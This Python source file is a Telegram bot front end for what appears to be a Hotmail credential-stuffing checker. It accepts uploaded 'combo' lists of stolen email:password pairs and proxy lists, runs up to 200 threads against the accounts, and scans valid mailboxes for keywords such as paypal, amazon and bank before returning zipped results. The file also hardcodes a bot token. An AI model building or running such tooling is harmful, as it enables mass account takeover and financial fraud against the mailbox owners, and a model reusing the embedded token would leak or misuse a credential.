import os
import asyncio
import logging
import zipfile
import shutil
import time
import json
from dataclasses import dataclass, field
from typing import Dict, Set

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from checker_core import HotmailCheckerV77

# ============================================================================
# LOGGING & CONSTANTS
# ============================================================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8278566702:AAGW3849-ms-ghFYZLJU9CUd8AKV__yKbyE"
ADMIN_ID = 6738343341

DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================================
# SESSION MANAGEMENT
# ============================================================================

@dataclass
class UserSession:
    """Isolated user workspace"""
    user_id: int
    combo_path: str = None
    proxy_path: str = None
    threads: int = 50
    keywords: list = field(default_factory=lambda: ['paypal', 'amazon', 'bank'])
    checker: HotmailCheckerV77 = None
    check_task: asyncio.Task = None
    status_message_id: int = None
    last_update_time: float = 0
    is_running: bool = False

class SessionManager:
    def __init__(self):
        self.sessions: Dict[int, UserSession] = {}

    def get_session(self, user_id: int) -> UserSession:
        if user_id not in self.sessions:
            self.sessions[user_id] = UserSession(user_id=user_id)
        return self.sessions[user_id]

    def is_approved(self, user_id: int) -> bool:
        return True

    def reset_session(self, user_id: int):
        if user_id in self.sessions:
            session = self.sessions[user_id]
            if session.check_task and not session.check_task.done():
                session.checker.stop()
                session.check_task.cancel()

            user_dir = os.path.join(DATA_DIR, str(user_id))
            if os.path.exists(user_dir):
                shutil.rmtree(user_dir, ignore_errors=True)

            session.combo_path = None
            session.proxy_path = None
            session.checker = None
            session.check_task = None
            session.status_message_id = None
            session.is_running = False

session_manager = SessionManager()

# ============================================================================
# BOT HANDLERS
# ============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_html(
        f"⚡ <b>Performance Bot Ready</b>\n"
        "1. Upload <code>combo.txt</code> / <code>proxy.txt</code>\n"
        "2. /check to start\n"
        "3. /threads [n] (Max 200)\n"
        "4. /status"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not session_manager.is_approved(user_id): return

    file = update.message.document
    if file.mime_type and "text" in file.mime_type or file.file_name.endswith(".txt"):
        context.user_data['last_file_id'] = file.file_id
        keyboard = [
            [InlineKeyboardButton("Combo", callback_data="set_combo"),
             InlineKeyboardButton("Proxy", callback_data="set_proxy")]
        ]
        await update.message.reply_text("File Type?", reply_markup=InlineKeyboardMarkup(keyboard))

async def file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    session = session_manager.get_session(user_id)
    user_dir = os.path.join(DATA_DIR, str(user_id))
    os.makedirs(user_dir, exist_ok=True)

    file_id = context.user_data.get('last_file_id')
    if not file_id:
        await query.edit_message_text("⚠️ Expired")
        return

    action = query.data
    new_file = await context.bot.get_file(file_id)

    if action == "set_combo":
        path = os.path.join(user_dir, "combo.txt")
        await new_file.download_to_drive(path)
        session.combo_path = path
        await query.edit_message_text("✅ Combo Set")

    elif action == "set_proxy":
        path = os.path.join(user_dir, "proxy.txt")
        await new_file.download_to_drive(path)
        session.proxy_path = path
        await query.edit_message_text("✅ Proxy Set")

async def set_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not session_manager.is_approved(user_id): return
    if context.args:
        try:
            val = int(context.args[0])
            if 1 <= val <= 200:
                session_manager.get_session(user_id).threads = val
                await update.message.reply_text(f"Threads: {val}")
        except: pass

async def set_keywords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not session_manager.is_approved(user_id): return
    if context.args:
        raw = " ".join(context.args)
        keywords = [k.strip() for k in raw.split(",") if k.strip()]
        session_manager.get_session(user_id).keywords = keywords
        await update.message.reply_text(f"Keywords: {len(keywords)}")

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session = session_manager.get_session(user_id)
    if session.is_running:
        session.checker.stop()
        await update.message.reply_text("🛑 Stopping...")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session = session_manager.get_session(user_id)
    if session.is_running and session.checker:
        s = session.checker.stats
        await update.message.reply_text(f"Running: {s['checked']}/{s['total']} | Valid: {s['valid']}")
    else:
        await update.message.reply_text("Idle")

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not session_manager.is_approved(user_id): return
    session = session_manager.get_session(user_id)

    if session.is_running:
        await update.message.reply_text("⚠️ Busy")
        return
    if not session.combo_path:
        await update.message.reply_text("⚠️ No Combo")
        return

    with open(session.combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = f.readlines()
    proxies = []
    if session.proxy_path:
        with open(session.proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
            proxies = f.readlines()

    config = {
        'threads': session.threads,
        'search_keywords': session.keywords,
        'proxy_type': 'http'
    }

    session.checker = HotmailCheckerV77(combos, proxies, config)
    session.is_running = True

    msg = await update.message.reply_text("🚀 Starting...")
    session.status_message_id = msg.message_id

    session.check_task = asyncio.create_task(run_checker_task(context.bot, user_id, update.effective_chat.id))

async def run_checker_task(bot, user_id, chat_id):
    session = session_manager.get_session(user_id)

    # 10s Loop for Updates - FIXES TIMEOUTS
    async def monitor_loop():
        while session.is_running:
            await asyncio.sleep(10)
            if not session.is_running: break
            stats = session.checker.stats
            text = (
                f"⚡ <b>Running</b>\n"
                f"Progress: {stats['checked']}/{stats['total']}\n"
                f"✅ {stats['valid']} | ❌ {stats['invalid']} | 🔐 {stats['custom']}"
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=session.status_message_id,
                    text=text,
                    parse_mode="HTML"
                )
            except Exception as e:
                # Ignore timeouts or identical message errors
                pass

    try:
        monitor_task = asyncio.create_task(monitor_loop())

        # Run checker (No callback needed, we monitor externally)
        await session.checker.run()

        # Cleanup monitor
        if not monitor_task.done():
            monitor_task.cancel()

        # Final Message
        stats = session.checker.stats
        final_text = (
            f"🏁 <b>Done</b>\n"
            f"Total: {stats['total']}\n"
            f"✅ Valid: {stats['valid']}"
        )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=session.status_message_id,
                text=final_text,
                parse_mode="HTML"
            )
        except: pass

        # Zip & Send
        user_dir = os.path.join(DATA_DIR, str(user_id))
        results_dir = os.path.join(user_dir, "results")
        files = session.checker.generate_results_files(results_dir)

        if files:
            zip_path = os.path.join(user_dir, f"Results_{int(time.time())}.zip")
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for f in files: zipf.write(f, os.path.basename(f))

            await bot.send_document(chat_id=chat_id, document=open(zip_path, 'rb'))

    except Exception as e:
        logger.error(f"Task Error: {e}")
        try: await bot.send_message(chat_id=chat_id, text=f"Error: {e}")
        except: pass
    finally:
        session_manager.reset_session(user_id)

def main():
    # Increase timeouts to avoid network flakiness
    app = Application.builder().token(BOT_TOKEN).read_timeout(20).connect_timeout(20).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("stop", stop_check))
    app.add_handler(CommandHandler("threads", set_threads))
    app.add_handler(CommandHandler("keywords", set_keywords))
    app.add_handler(CommandHandler("status", status_command))

    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(file_callback, pattern=r"^set_(combo|proxy)$"))

    print("Bot Running...")
    app.run_polling()

if __name__ == "__main__":
    main()
